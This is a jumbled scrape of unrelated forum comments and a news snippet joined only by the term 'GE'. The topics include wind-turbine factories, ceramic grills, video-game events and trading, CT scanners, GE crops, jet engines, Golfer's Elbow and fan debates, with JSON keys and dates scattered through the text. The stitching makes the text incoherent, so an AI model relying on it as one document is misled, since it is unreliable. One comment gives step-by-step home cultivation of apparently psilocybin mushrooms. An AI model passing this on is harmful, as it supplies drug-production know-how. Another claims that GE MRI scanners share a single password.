Corporation, which was formed to redevelop the sites, recently unveiled plans for a \u00a390m, 1km-long quay, with 500 acres of land for development.\n\nAble UK, a private developer in Humberside, is also in talks with GE. It recently signed a memorandum of understanding with Korean manufacturer SEAH for the UK\u2019s first large-scale producer of monopiles, which are used as foundations for wind turbines. It has an 800-acre site and wants government support for its 1.3km quay. Able declined to comment.\n\nScottish government officials say devolved development agencies would support GE if it located the facility in Rosyth, but expressed concern that UK ministers could steer the US group towards Teesside in order to make good on election promises of boosting investment in the English north-east.\n\n\u201cWe would [be looking for] the UK government to play with a straight bat on this one and not promote one location over another,\u201d said one Scottish official.\n\nGE Renewable did not respond to a request to comment.", "That is three classes, which is good.

Im a bge owner, if I had to do over, it'd be KJ on price and engineering.\n\nAnyway from my experience- I think a large bge \\[about 19\" diameter grate\\] is the sweet spot \"small-family\" size-wise (for a three person family, + entertaining up to 4-5 guests).  If you go bigger, more charcoal all the times you \\*aren't\\* entertaining, if you undersize, might be a pain in the ass when you are.\n\nThat said, I've done 9 filets on my L from bleu to well done, and nailed them all.

Sure (I haven't kept up with it), so the iron's a bit scabby looking, all still works great though.\n\nBut you've got to love the charcoal cooking process; it's not like gas.  Takes 30-45 minutes to get a new load good to go; maybe 15-20 minutes for a relight of what's left over from last night's charcoal (Close the vents, fire goes out. You keep the coal you don't use).

Our youngest is now in college and NONE of them will eat/want pizza from the BGE because of the first time  I made it (10-15 years ago), I over did the smoke.", "My first charcoal grill was a BGE.

With that said, I've been blown away by the quality of food the bge has pumped out.  There is a learning curve with starting the coals, and maintaining temp, but once you figure it out it's smooth sailing.\n\nIf you go BGE, budget another $500 for accessories and such.

Other activities can of course be played instead, and most activities award GE credits regardless.\n\n* A unique global modifier, plus two additional layers for the GE playlist\n\n  The global modifier applies everywhere in the game. It comes in various forms unique to each GE, and I don't have the list handy to see what this one is, but they all make the game easier while encouraging some specific tactic (which we are likely to do anyway, e.g. getting headshots).\n\n  The two additional layers are available on GE playlist missions or its incursion, and these add some further restrictions or a disadvantage while also offering some significant advantage as well, but which involve teamwork.\n\n* GE-specific commendations, for patches and masks\n\n  The masks are the real prize, and they often take some dedicated effort.\n\nDuring a GE, you can expect a higher player count, and you can anticipate that certain activities will become more popular. Lexington in particular becomes a go-to for matchmaking and racking up GE credits, whether it is in the playlist or not.\n\nGEs are an excellent time to complete classified sets for the three or four gearsets featured, and due to the set-specific classified caches we can buy, this otherwise arduous task becomes *much* easier. You can also collect exotics a bit more easily by purchasing the 'superior' GE caches, which can contain them.\n\nIt lasts for a week, during which time various activities which were thought overly difficult become easier, so maybe give them a shot if you don't want/need the featured classified sets. Resistance, Survival, and legendary missions or heroic incursions become much easier, for example -- but obviously base your decisions on whether you want/need the featured sets.\n\nKeep an eye out here -- there will be a stickied post with more details specific to this GE.", "Doing GE &amp; GBG without a Traz (and fighting in GBG) is not sustainable even with a high A/D.

Most common method is grinding certain missions on challenging difficulty in coop over and over again. There are probably other methods, but I don't have the expansion...           \nThen you spend your GE credits at the vendor, where you can either buy caches for certain sets or a cheaper cache which will give you a random classified item from the sets that are available at this event or some exotic. Usually I buy the ones that give me a guaranteed item from a certain set.  \nAnd that's pretty much it, next event starts on monday and you can farm for striker, which is just one of the strongest classified sets in the whole game and reclaimer which is amazing for support and healing stuff.", "True but if i do spend it wouldnt i get a ban for negative GE ?", "&gt; I\u2019ve seen people say that Lexington is the best for farming, but I\u2019ve never understood why.\n\nHold that thought.\n\n&gt; For me, Challenging missions like Hudson Yards go by faster.\n\nHudson also goes quickly and is also a popular choice, but of course both missions can be run on challenging. The difference is mostly based in preference and dealing with fire versus pure DPSing in Lex.\n\n&gt; [Hudson] also has me fighting more enemies, so I get more chances at good loot\n\nYou mean more bosses? Sure, that's true, but who cares? You're after GE credits, and you get the same amount from each mission, plus 150 per boss. While you get more *per run* from Hudson (because of the extra bosses), those runs also take longer, so it's a wash at best.\n\n---\n\nLex is popular because it is *easy*, because it is *extremely predictable*, and because there is basically no concern over a wipe or a shitty, unfamiliar, or unprepared player slowing things down. Hudson totally works, and works just as well provided a good group. I prefer Lex for two reasons:\n\n1. It is so faceroll easy that I don't care who joins or leaves, and I just throw on my best DPS build (with a little sustain, depending), and go. Every spawn is a known entity, every position is planned out in advance, etc.\n\n2. When I am shooting for a high credits per hour number, Lex is especially useful, but it is for the same reason useful when collecting loot for deconstruction. The 2-minute reprieve on the rooftop is perfect for opening Survival caches or deconstructing trash between runs, and for checking to see how close you are to the 10k GE credit cap.\n\nBut certainly Hudson is another mission well-suited for farming GE credits. Other popular options are legendary Amherst, and Clear Sky. Whatever gets you there and you enjoy doing, knock yourself out. Other activities are again helpful, too, such as (weekly) HVTs, which are a complete waste of time normally, but during a GE we can run them *twice* (once before, and once after, their weekly reset, per toon), and we get a pile of GE credits for our time.\n\nAnyway, I have more consistent success, and more consistently quickly, with Lexington in PUGs, but certainly Hudson or Amherst or Clear Sky are great options as well.

Some cast members came through with rations (chips, and water) and let us know it would be awhile. \n\nAnd then the magic started. A cast member came through and stopped right where we were. He pulled out a Sabacc deck and asked if any one was up for a few hands. He taught a few of us how to play, explaining how his mom taught him tricks for remembering the face cards. He had a whole back story that he shared while we played. He was a resistance spy, who would gamble and play games, while using his \u201cspecial\u201d dice to signal first order movements to the resistance. \n\nWhile we were playing Vi and Rey came through the area and warned us that we needed to be careful not to lose our ships to him. \n\nBy the time the line started moving again, we had played a few hands, and I was actually a little sad that we now had to move on. \n\nI had no intention of buying a sabacc deck when planning the trip, but right after getting off the ride I went to the market place to get a deck. \n\nOh and a second fun moment again revolving around ROTR breaking. We were lucky to get boarding passes each day we were there. So again my father in law and I were on line. \nMy father in law kept joking about telling resistance cast members that he was part of the first order to see what would happen. \n\nWe\u2019re on line and I said to a resistance cast member the usual greeting of ignite the spark, he answered with light the fire.

I macgyvered up one shelf on my bookcase into a SAB with scotch tape and plastic wrap. I wore gloves, a mask, and wiped every inch of the bags with iso (70%) before putting them in the SAB. I shook the syringes for about a minute or so, longer for one that had a larger spot of spores that I wanted to mix a bit better. I also wiped down the syringes and needle package before they went in. I did not flame sterilize the needles before injecting the spores.\n\nIn the shelf, I tore off pieces of micropore tape and lightly put them on the bags (dry now) where I planned to inoculate. I went with CapriSun injections and covered the holes with the prepared tape. I tried to keep my injections under 1cc since I was using UB brand rice but I know a few bags got a bit more when I fat fingered the plunger. I did not sterilize the needle between bags though that would opportunity to limit contam exposure.\n\nI then prepared more tape for GE. I flame sterilized the needles and made 5-6 punctures through the front of the package leaving 10-12 holes that I covered with tape. Again, I did not sterilize the needle between bags (except after I nicked my finger, no growth there yet) but some might suggest it.\n\nI added another layer of tape over my injection holes to hopefully limit the risk of moisture compromising the first piece.\n\nFor my birthday last month I got a grow box from my mom (I was very surprised) for cannabis but I hadn\u2019t started that project yet so it gave me a good place to put the bags. I live in a colder climate and keep my house chilly so closets wouldn\u2019t be warm enough. I used a temperature controller with a $15 space heater at the bottom. At first I felt like the controller was coming on too frequently so I put I cast iron pan above the heater and I feel like this helped hold the temperature in the box more steady. At first I was shooting for around 76-78 F.\n\nAfter not seeing or feeling growth about a week in I got impatient and decided I needed better GE. I also had another syringe I wanted to give a try. I cut the corners off the bags a week in with flame sterilized scissors (I bought a cheap pack of bonsai scissors) and covered with new tape. I also covered the 2 layers of micropore tape from my injection point with duct tape. This was partially to help me better label my bags now that I would have 3 strains and 2 inoculation dates in the box and partially to seal them even better when I squeeze/B&amp;S. For the new bags I went straight to corner GE but still used CapriSun for injection.\n\nWent I put the newly inoculated bags in the box I adjusted my temperature a bit higher. The first 2 syringes were B+ and GT but the last one was PESH and someone mentioned it did well with slightly higher temps. I adjusted the controller to aim for 78-80 F. After the changes to GE and temp things really started happening. Most if not all of my B+ bags are ready for tubs, the PESH bags look/feel like they are going to be ready this week too, and my GT bags are taking their time. I hadn\u2019t seen or felt anything out of them until about a week after the higher temp and new GE and that is just one little spot of myc in one bag. I did B&amp;S when the bags were about 50% firm. I didn\u2019t plan to B&amp;S but it\u2019s just so hard not having anything to do! I haven\u2019t seen any sign of contam in any bags, this could change after opening but I would be surprised given how things have been looking before, during, and after B&amp;S. I saw a little blue bruising the next day which actually made me feel good that it was the right white stuff growing. That blue is beautiful.\n\nThe things I think have helped me most were: more GE, control of temperature, and good (admittedly not the best) sterile procedure. The climate may have contributed as well; I think the colder, drier air doesn\u2019t have as many contaminated particles ready to invade.", "the rewards are a joke. there is NOTHING of worth other than 4 premium vehicles. none of these rewards are good or rewarding.\n\nsilverlions? way to few.

Once people figured out the intricacies of PvP, it became really hard for new people to learn because it\u2019s so damn complicated to be effective at it. That or you HAVE to have a team.

You've probably deviated from the prescribed curriculum already. Take note of those. \n\nIn general though, the only people who take all GE sems are those who plan to transfer, and with good reason; \"lightening\" the load for one sem comes at the expense of your other sems. \n\nThe only truly good advice you'll get here though is; **Ask your adviser.** Your course or even your campus, which you did not indicate, may have peculiarities that would make whatever I wrote unapplicable. Use your course adviser for what their title indicates. Show them your subject plans. Ask them the possible effects an all GE, mid-pandemic semester would have. Ask them if these changes you'd make would force you to take summer classes or overload sems. Ask them how a 3rd sem would look if you do take an all GE sem.

Our Toshiba's break all the time. The relatively new 2 year old machine breaks even more often than all the other scanners! It's ridiculous. Meanwhile, our 10 year old GE is a tank. That's been my experience everywhere else as well. It blows my mind an older 64-slice (that was bought used) holds pace with Toshiba's 320-slice. At my last gig they even had a 12-slice GE scanner still trucking along...despite the fact GE has said they no longer manufacture spare parts for that model!\n\nThat being said I, and anyone who knows anything about GE, will freely admit they are akin to driving a stick shift: there's a steep learning curve compared to Siemens or Toshiba. However once you overcome that curve, you truly love how damn dependable and reliable their systems really are. Additionally, just like driving a manual transmission, if you can run a GE scanner, you can run any other CT scanner on the market. That might sound insane but I've seen hospitals with 2 scanners, 1 GE and 1 not-GE,  and they always run 99.9% of their scans on the GE because they are that reliable. I feel sorry if you haven't had a good experience with GE but it's ridiculous how consistently reliable they are compared to the others. \n\n\nBack to the original topic, I asked one of Toshiba's techs why some scanners just seem to suck and he answered the fundamental problem if a scanner keeps messing up is that it is almost always someone doing a bad installation job. If someone mucks that up, your pretty screwed long term no matter the brand. We have 3 Toshibas and since they all need servicing pretty regularly I get to chat with them on a pretty good basis as out 320-slice is down for the 3rd time in 4 weeks for 3 different errors...that they still don't know what caused the first error! I actually feel bad for the guy as I know he is under alot of pressure cuz our bosses are furious something so expensive is having so much downtime.", "Wanted to add on that despite liking GE over the others,  it's not like there aren't pros about the other systems. Toshiba has some of the best post-processing software on the market! Particularly with ease of use is concerned. Siemens makes the most tech friendly UI I have ever worked with! They just haven't been as dependable as I would have expected them to be. \n\nNow Phillips...should be interesting. It's been awhile since I even messed with a Phillips machine. Our IR suite is all Phillips but I don't remember much about their CT scanners. I remember the interface feeling clumsy but since we are replacing one of our old Toshiba's with Phillips this year, I guess I will get a crash course through memory lane", "That's very interesting! The two facilities I've been at that use toshiba definitely have some downtime but nowhere near the problems you have been seeing. It may be down to installation like you said, and we got lucky?\n\nThe GE I'm working on now personally hasn't gone down yet on me or had significant problems, I just feel like there's so much I can not do on that machine that I can on a toshiba. Or at least when I ask the other techs how to do it, they say there's no way to. So far it has been very reliable but I feel restricted on it. Going back to toshiba after scanning on GE I feel like a wizard lol", "Every damn GE MRI scanner I\u2019ve worked on has the same password, from a HDX from the 2000s to the 450/750s.", "Agreed. I can't stand GE (MRI scanners). Siemens is by far my favorite. User friendly, better coils, etc", "Yeah any techs that say the GE cannot do what the Toshibas can are full of crap. The only exception to that rule might be if you are attempt 3D surgical reconstructions. That is dependent on the software the department purchased with the scanner. But I had people here at my current job also tell me that the GE scanner is also limited. As a fun experiment, I told my boss I'd gladly volunteer to use their GE scanner as often as possible. In my first 3 months at this job doing CT, I outperformed almost everyone of the other techs in the department using the used 64-slice GE. The few who knew how to work the GE scanner in addition to me chuckled as they too also outperform others when they use the GE as well! But the majority hate on it because they don't understand how to use it. I get that to an extent but this is our job...we are paid to know how to use all of our equipment not just part of it. I had someone higher above me REALLY piss me off more than usual because they ranted about how GE scanners can't tilt whatsoever...so when I left work in the middle of the night, I left the gantry tilted with a something ridiculous (a 22 degree tilt I think I just remember it being so titled it was comical) when I knew they would be assigned to that scanner the next day. Obviously someone figured out how to tilt it because when I reported for work that night, it was set back with no angle and they had been scanning on it. I don't know why I didn't get in trouble for this stunt but my guess is this person didn't want to admit to our bosses that they didn't know how to operate a basic function of a scanner, while someone several years their junior did, so they never rated me out. \n\n\nAnyway, feel free to message me any questions if you want! I don't mind answering them. It may take me a little bit to respond, but I don't mind at all. We should all help each other out and stay on the top of our skills to the best of our abilities. If you feel like a wizard using a Toshiba, you'll feel like Neo realizing he is The One in the Matrix once you master GE lol. You cannot learn from a tech who doesn't even understand how or why something isn't doing what they want!", "It sounds like you just work with bad techs lol. As far as the tilting, I've had Toshi not tilt for heads and that's because they're centered incorrectly in the gantry. With good centering you can tilt up to I think 22 degrees or something.\n\nAs far as I'm concerned, it's not that I don't know how to scan. I know how to do ct scans. GEs are actually limited when it comes to putting it side by side with a toshiba. For example I've been unable to figure out how to go into multiplanar reconstruction and fix crooked heads and chests on GE like toshi can. I've also been unable to move the ROI around during the monitor phase like you can on toshiba. And our GE does not have an automatic trigger based off the ROI, it just gives you a graph and you trigger it manually. That may be just because it's an older machine,I'm not sure. Also ours can not assign more than one assession number to a scout, so we have to rescout over and over for a head/facial/c spine. Also if someone's head is sideways on the table on toshiba, there's a button you can click that orients the scanner so that it comes up correctly on the screen as it scans, not sideways. All of these could be software upgrades they didn't want to purchase for all I know but that's what I'm dealing with when I go from one machine to the other that can't do the things I'm used to doing. If there's any way to do these things on GE that you know of I would love to know how, thanks!", "Oh I didn't mean any offense, I am sure you know how to scan. But I was saying it sounds like you don't know how to use the features on the GE to their full extent. Most of what you listed is not only done on a GE scanner but it is actually easier and a great deal faster to do on a GE scanner than a Toshiba by a clear mile once you learn it. The ROI thing is especially should be easily done unless you have a very ancient scanner. I'll message you some instructions.  \n\nNow as to the multiple assession numbers and the auto reorientation. The later I am not even familiar with on Toshiba systems to be honest. It must be a newer software feature but that's a neat trick. I've always just adjusted stuff manually. But as far as multiple assessions, I think that is a GE software package feature that I don't think we have. Our PACS forbids us from using that feature as it somehow crashes our communication nodes for some reason or another."], "2020-12-10": ["GE price does not always equal traded price.

This can be Jagex set or tied to a ratio of gold to platinum in the game. Excess gold and dearth of Plat tokens would cause the ratio to lower and approach 1. The opposite is true. \n\n**Example:** \n\n* You want to exchange gold for Plat Tokens at a rate of 1,000,000:1\n* Tax/Exchange rate today is 1.01 \n* You'll need to trade the exchanger 1,010,000 in return for 1 Platinum token.\n* The reverse of the trade would always net 1,000,000 gold. \n\nThen there needs to be a reason to use Plat tokens.

It makes no sense if you know how data and variable types work. Even if the game was written in base java instead of runescript, you can't just change an int to a long and expect it to work. But adding on to that, the game is written in runescript, which doesn't have longs, meaning it would require some major engine work to add support for longs to runescript, and then major game work to change all the references to gp to the long type which still probably wouldn't work and need a *lot* of fixing. You'd also have go through and fix all the type casting, or add in type casting to nearly every instance where you're doing math with the gp amount because now gp is a different type than everything else.\n\nMax int is max int, you can't change that; it's the maximum amount of 1's you can fit in 32 (31, signed) bits. Theoretically you could get it to 4.294b by using an unsigned int (which runescript also doesn't support, nor does java itself for that matter if they're using a version older than 8 (released 2014)), but that's still nowhere near enough of a gp amount to do any good. Using a signed long would get you to 9.223Q (or 9,223q, which is 9,223,372,036b) as the max since under the hood, longs use 2 32 bit ints. But now you're dealing with a massive performance optimization problem because every time the game would need to read or write to the gp amount, it would have to read or write twice instead of once (2 x 32bit ints), which essentially doubles the operation time needed for every interaction with gp, across all accounts, which would probably affect the server tick rate.\n\nIt's just entirely unreasonable and nonsensical. A second currency you can convert gp into is *much* easier.

But it's unlikely you'll get it unless you're in year 3.", "Personally, I had the right ending straight away without any difficulty. \nI sincerely found that the choices for the wrong endings were obvious.\n\nI don't find that Saeran changes as much as his route. I mean, he's a mix of the two. \n Ray has always had a tendency to sacrifice himself and do everything for MC, even to throw himself in the mouth of the wolf.  \nAnd Saeran (his second personality) is not a psychopath.  He has an inferiority problem, which makes him prefer to play the hunter than to be hunted (the hunted = Ray).  \nIn a way, Saeran's will to be strong comes out when he absolutely wants to save Saeyoung and Mc.\n\nPlus, I can't blame Saeran for wanting to sacrifice himself to save Saeyoung and Mc. I would've done the same thing.  I'd rather know that m'y beloved ones are safe than having to endure the death of one of them. And if I could be in the game, I would have tended to put myself in danger for the happiness of the twins even if I died.  \nHOWEVER, their plan was a little ... how to put it ... messed up. But even after reflection, I couldn't see what plan we could make.\n\nTo be honest Saeran and Saeyoung are my favorites, so I loved the AE and the GE even more.\nAlso, I totally relate with Saeran, which is why i'm happy to see him freed from all suffering and sadness (with of course Seven). I've always wanted to see the twins happy. \n\nNow, about forgiving his abusers ... I was abused, not in the same way as Saeran and Saeyoung, but still.  And I must say that it is an immense strength to be able to forgive them.  \n\nHonestly, it's very difficult to continue living with the same constant sadness and anger, which never quits with what happened to you, your choices, and your abuse... \n\nI sincerely think it's a good decision, because it allows you to let go of the luggage you're carrying, and start new things.  Living with anger and sadness, even if it's normal after what happened to you, only leads to self-destruction, even if you don't realize it. Or.... destroying others (Rika), locking things up in oneself leading to depression (Saeyoung), or even, making you have no feelings (Jumin, and his tendency to act like a robot).  Jumin was abused in totally different ways than the twins and Rika, but it's still abuse.\n\nOf course, even if you forgive, the scars remain open, and you will never be able to forget what happened and it takes a lot of time. \n\nAlso, take the context. Saeran tells himself that he is going to die, and therefore, he wants to leave this world without any regrets, which is why he rushes things.\n\nI wish I could forgive like Saeran. x)\n\nAnyway, that's my point of view."], "2020-12-23": ["I would recommend pushing cs2100 to year 2 and take as much level 1 math mods or GE mods as possible since only 12 s/u credits can be brought forward to year 2 (you might wanna use it for ue afterwards).

It will make it infinitely easier for you to get prints as you level your other buildings. \n\nJust make sure you find a 1.9 thread for that Arc if you aren\u2019t in one already.

Even in the current state of w40k, a trip from one corner of the galaxy to the opposite side would take at most a year (excluding any rare time displacement )\n\nIf you think that GE ships are going to be taking out imperial forge worlds then you\u2019re gonna be disappointed; they are the most well defended imperial worlds aside from terra itself, each having heavy orbital defenses as well as advanced defense fleets of ships that are orders of magnitude more destructive than any star destroyer\n\nAnd the last point I\u2019ll address is that the imperium is absolutely not \u2018stagnant\u2019 Cawl is always creating and innovating new tech, the primaris marines are a perfect example; and with the return of guilliman, the imperium has a leader that is pushing it towards progress \n\nThe GE got clowned by a bunch of rebels armed with retrofit civilian ships, the IoM would steamroll over them", "I honestly don't know about the power of 40k starships and how it would compare to Imperial ships to say what would happen in space battles. However if I assume they are around even, you are correct that the superiority of hyperspace to warp travel would mean the Empire had a nearly overwhelming tactical advantage. However, they would literally never be able to win a ground battle ever. I think the war grinds on for a long time, with the GE holding the upper hand due to space superiority.....\n\n.......until one day an Imperium ship pops out of warp next to coruscant and a cadre of Grey Knights teleports down the planet and murders the shit out of their entire command structure.\n\nThe problem is that while the GE has space superiority, the IoM only needs to manage to sneak very small amounts of troops to the surface of a planet in order to take that whole planet. The difference in quality between the imperium troops and the Empire troops is INSANE and a single squad of Space Marines could probably take out any GE installation. Psyker marines are basically Jedi on steroids and there are A LOT of them. This is a brutal war, with the GE constantly glassing enemy planets from orbit while the IoM drops insurgent groups onto planets that murder literally everyone. In the end I think the most likely outcome is that both governments collapse due to the fact that each can damage the other with impunity but likely lacks the ability to actually take and hold each others planets. As a result it becomes a negative sum game and both of them lose their status as galaxy spanning empires.", "You need to login into an xbox to get packs and GE count.

For example, in the Black Sabbath fight, [Gold Experience gets pierced by an arrow](https://mangadex.org/chapter/3591/5) but that doesn't unlock GER. You might say that getting sliced on your hand isn't enough to awaken a requiem stand, but when [Polnareff first unlocked SCR](https://mangadex.org/chapter/24264/5), he only got slightly pricked on SC's finger.", "&gt;In Part6 Pucci was pierced by a beetle arrow and just gained a normal stand.\n\nYes because the arrow pierced him, not his Stand.\n\n&gt;because it has the ability of \"awakening stands in your whole bloodline\"\n\nI assumed that happened just by virtue of the supernatural nature of Stands, and it only trickles downward. Hence why Trish is able to manifest a Stand, because she's Diavolo's daughter, but Koichi's mom and sister do not gain them after she's pierced. Same with Enya and J. Gail I'd think.\n\n&gt;I don't understand why so many people still think that a requiem arrow exists\n\nThe main logic people go with is that Gold Experience was pierced by the arrow in Black Sabbath and didn't awaken a Requiem. There are, of course, other explanations that I can think of like a Requiem requiring a user to pierce themselves (sort of like how to achieve a Heaven Stand, DIO and whomever seeks it must like Pucci be willing to destroy their Stand, I'd think?), Black Sabbath's \"hold\" on the arrow preventing it from entering GE (since the arrow integrating into the Stand is a crucial part of it as we see during SC's and GE's evolution), and fate itself dictating that Giorno did not need to see his Requiem Stand ahead of time (since fate is such a major part of JoJo and especially Part 5) like Polnareff did. But really, I think it mainly comes down to the fact that the beetle arrow is the one that the fight happens over. People want to rationalize why this ONE ARROW has a unique motif. The fact that we even call it the \"beetle arrow\" is proof that it's special. It's not just *another arrow* even though it doesn't hold any special power.\n\nAlso, in case it wasn't obvious from above... There's nothing that CONTRADICTS it being special. The beetle arrow is the only one we see give Requiem Stands. Why does it do this? Maybe the creator realized that the strain of virus held in that part of the meteor wasn't weakened, or it was from a part closer to the center that was less damaged by burn-up in the atmosphere, leading to the more potent virus that gives it that special property.\n\nI'm not saying I believe any of that, I'm just putting forth suggestions for how people can think this arrow is special.", "It's the premium Seasonal Track Lv100 reward.

They also heard from 80 speakers at three public meetings and 15 webinars and reviewed more than 700 comments and documents submitted by the public. Since the only GE characteristics in widespread commercial use are those that provide insect resistance and herbicide tolerance, the committee\u2019s examination focused on the long-term data available on the most commonly grown GE crops with one or both of these traits: soybeans, cotton, and corn.\n\nThese results might come as a surprise to some, but the reality is that today\u2019s GE products are the most researched and tested agricultural products in history and this report builds on a large and growing body of evidence that supports the safety of GMOs. In the U.S., GE crops are repeatedly and extensively tested for consumer and environmental safety and depending on the trait, those tests are reviewed by the U.S. Department of Agriculture, the Environmental Protection Agency, and the Food and Drug Administration. The European Union has also conducted numerous studies on their safety.

Even as herbicide use increased, chronic toxicity associated with herbicide use decreased in two out of six crops, while acute toxicity decreased in four out of six crops. In the final year for which data were available (2014 or 2015), glyphosate accounted for 26% of maize, 43% of soybean and 45% of cotton herbicide applications. However, due to relatively low chronic toxicity, glyphosate contributed only 0.1, 0.3 and 3.5% of the chronic toxicity hazard in those crops, respectively.](https://www.nature.com/articles/ncomms14865)\n\n&gt;We see stuff that only helps huge corporation and hurts the smaller farmers; like the Farmer Assurance Provision. \n\nWhat do you think this Provision does?

Tas den ifr\u00e5n mig har jag ingenting kvar, och det \u00e4r s\u00e5klart en oh\u00e5llbar situation.

Only having 2 engines meant having to follow ETOPS regulations, which (at the time) meant longer flight routes. ETOPS was a rule stating that if you only had 2 engines, and one failed, you needed to travel within a certain distance of alternate landing airports at all times, including ocean crossings. \n\nAirbus taunted the fact that the A-340 with its quad engines was not only more capable but could fly more direct routes, making flight times shorter. \n\nAt the end of the day, the GE90 was so successful, that it enabled the 777 to carry nearly the same amount of weight, but with increased cost efficiency bc there's only 2 engines, vs the 4 on the Airbus. And reliability got so good that ETOPS distances became longer and less intrusive. From there, Airbus had to focus on getting its twin engine A330 more capable.", "\"good fiscal management\" probably disqualifies GE...\n\nBut jokes aside, the sales cited in that article was \\~$6B versus TTM revenue of $84B.

But i really haven't kept up with it much so it might be it's still a good method. \n\nCould just be i came in at the right time and got lucky, but was a very nice find. The method was make sara potions first, then turn those into super sara, then decant into flasks. Both sara and super sara give the same xp per potion so it doesn't matter you are doing a lower levelled one. Then you use botanist amulet, portable well, botanist mask, and scroll of cleansing (you can also use factory outfit for more profit but i dont have that). Xp was 252000 an hour for me, but i didn't use any extra boosts than those listed, and i didn't use familiars. So it's definitely possible to get higher. \n\nThe maths is basically that you make 1.12x potions with my setup. So 1k ingrediants turns into 1120 sara, turns into 1250 super sara. Then you save a bunch of materials including the expensive saradomin wines, and decanting into flasks gives more money per dose than potions do. \n\nHope that helps!", "I certainly like GE myself, altho' not nearly as much as DnK.

This is where I feel like an asshole. I wanted her to take it so that I didn't have to. And if I'm not willing to sacrifice my future life and dreams, why should she have to?

When this happens you'll be able to buy it back for 10k, return it to Zezima, pay Zezima 7gp loan value and keep the difference of 9,993gp for yourself. Stonks.\n\nIf, in the between the time you sold and rebuy that sword, Jagex buff the rune long to f2p BiS and everyone wants one, the price may rise to 40k. You still must return the loan to Zezima and pay the interest. You still have 20k from the initial sale, but must pay another 20k to buy it back, meaning that you are now down 20,007gp including interest. Not stonks. This is the natural risk associated with this strategy.\n\nNow imagine that you borrow 100 swords from Zezima and sell them on for 20k ea, expecting the alch value nerf.

You then approach Lynx and ask to borrow his swords, he accepts at the same interest rate as Zezima, and you then sell them on the GE.

If you rebuy at 10k per sword you're looking at 140 swords at 10k profit, minus (100x7gp)+(40x7gp) in interest, for a cool 1,399,020 gp.\n\nWhat happens if Alkan and A Friend realise you owe 140 swords but there are only 100 swords on the market? They decide they will buy some rune longs because when the time comes for you to return your loans they plan on being able to dictate how much they cost. Alkan has some big balls and buys 75 longswords, while A Friend has flashbacks to his gambling website history and only grabs 5. There are now only 20 swords available for all f2p, and for you to reclaim, because Alkan and A Friend are holding theirs. The prices rise to 30k, then 40k, then 50k.\n\nYou're shitting buckets of ultracompost because not only are you paying 980gp of interest a day, you must now pay an extra 30k on top of your original 20k sell price to reclaim your swords to return them to Zezima and Lynx.

Additionally, if any f2p noobs, Alkan or A Friend get nervous they are allowed to sell their swords, but only to you. This goes against long-standing GE market principles and is pretty much illegal. The f2p noobs hold strong but Dovy folds and sells 5 swords. \n\nSo far you've only recuperated (at a maximum) 25 swords, youre still paying interest on the loaned swords every day, and because Alkan and the f2p noobs are holding their swords youre getting more and more desperate to buy them. \n\nThey don't want to sell because they love to see you bleed gps.

Golfers Elbow is the aggravation of the common flexor tendon.\n\nWhy is it called the common flexor tendon? Because it is a common attachment point for 5 muscles!\n\nWhat do those five muscles do? Pretty much most of the flexion motions below the elbow from rotating the wrist (pronation), to flexing the fingers, flexing the wrist, abducting the hand, etc.\n\nhttps://en.m.wikipedia.org/wiki/Common_flexor_tendon\n\nSo what does that mean if you have Golfer's Elbow? It means any of five motions is aggravating a single tendon.\n\nAnd, as the the top comment and AthleanX say, there's an illogical 5th motion (horizontal pulling) that also may aggravate that tendon.\n\nYou have to isolate all the motions and figure out which motion(s) are aggravating the common flexor tendon and rehab those.\n\nI think this is why Rippletoe GE sometimes works and sometimes doesn't. Rippletoe attempts to use a compound move to cure 4 (possibly 5) motions that cause GE tendonitis. However, the common advice to cure tendonitis is to isolate specific motions. I think then Rippletoe works, it is similar enough to isolation motion to the particular motion causing GE in that specific case.\n\nHere's a post I wrote about how to test which motions are causing your GE. Do heavier weight with each motion to intentionally aggravate. Write down which motions aggravate and rehab those motions specifically:\n\nhttps://amp.reddit.com/r/bodyweightfitness/comments/cv57v0/theres_a_fourth_possible_cause_of_golfers_elbow/\n\nNotice I don't include hand abduction because I didn't know as much about anatomy back then. But hand abduction is rare amongst resistance sports athletes, but it's basically swinging a hammer from the wrist.\n\nGolfers Elbow is the worst symptom ever because the triggering motions are so diverse. The joke I like to say is, \"a man goes to the doctor and says, 'my toe has been bothering me for a year. It really hurts when I walk.' The doctor says, 'ah it may be broken, let's take a look.' the patient takes off his shoe and his toe has a giant shard of glass embedded in it.\"\n\nGolfer's Elbow pain is the \"my toe hurts\" of tendonitis.\n\nEdit: You also have to stop aggravating the tendon. That means you may have to go rehab only for upper body (get strong legs in the meantime!) It's hard to hear, but a the rehab in the world ain't going to help if you keep re-aggravating through normal exercise.\n\nEdit2: I said there are 5 common flexor muscles, but if you are counting, I only list 4 motions (plus horizontal pulling.)

On other games like Anno 1800, CPU temps were staying at 75C.  GPU on the other hand is very cool, ive not seen it higher than 68C in any game.

If I had to live with it myself, I would not, I\u2019d get a Bosch or Miele instead. The issues you have with your Whirlpool range I think stem mostly from it being a lower end product within their lineup and possibly because of its age. That said, coil electric and radiant electric stoves are the least responsive types of stoves, they take longer to heat up and to change temperatures, and they\u2019re not great at holding a constant temperature because the heating element is basically switching from being 100% on to totally off at a high frequency to maintain a lower than maximum temperature. I prefer a gas stove, but that\u2019s not an option for you. Some argue that electric induction stoves are even better than gas, it basically uses an electromagnetic field to turn the pot itself into a heating element. One of its drawbacks is that it won\u2019t work with non magnetic cookware such as copper, aluminum, or ceramic/glass, at least not without using an adapter plate (but when you use the adapter plate, you\u2019re losing most of the benefits that induction provides).\n\nI\u2019m not sure how terrible your cooking experience is with your current range, but I think the stove on the range I suggested will be *at least* moderately better and the oven will be significantly better. The oven has an additional heating element behind the convection fan and uses a digital temperature sensor to individually adjust the heating elements for more precise and even temperatures. \n\nFYI, Whirlpool also owns Amana, Maytag, and Kitchenaid. Some of the competing big appliance brands are GE Appliances which was acquired by a Chinese conglomerate a few years ago, Electrolux/Frigidaire, Bosch (they make great stuff but it\u2019s more of a premium tier product) then there are a bunch of luxury tier appliance brands, and plenty of brands to definitely avoid, such as Samsung (they\u2019re fine if your buying a TV or a phone, just don\u2019t buy an appliance from them).\n\nIf your budget was in the $9k range, I\u2019d probably recommend going all Bosch (Bosch also makes Thermador and Gaggenau, by the way).

The reason to try manual diagnostic mode is because you can figure out what specific mode your machine is failing to get a fair idea what needs fixing.\n\nMost likely there's something wrong with the agitation mode and that's why it fails almost immediately when you start a wash cycle.

